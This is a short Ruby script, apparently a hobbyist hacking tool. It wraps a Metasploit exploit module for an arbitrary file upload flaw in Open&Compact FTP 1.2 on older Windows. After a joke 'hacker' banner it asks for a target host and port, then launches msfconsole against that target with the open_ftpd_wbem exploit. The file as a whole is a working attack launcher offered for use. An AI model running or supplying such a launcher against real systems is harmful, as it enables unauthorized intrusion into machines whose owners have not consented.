require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
       Open-FTPD 1.2 Arbitrary File Upload
   Open&Compact FTP 1.2 on Windows (Before Vista)
""".red
puts """
          Automatic Target Port 21
""".white
   

puts " [?] What is the target? ".blue
print "[!] ---> ".white

target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow

port = gets.chomp

exec("msfconsole -x 'use exploit/windows/ftp/open_ftpd_wbem' -x 'setg RHOST #{target}'  -x 'setg RPORT #{port}' -x 'run'")

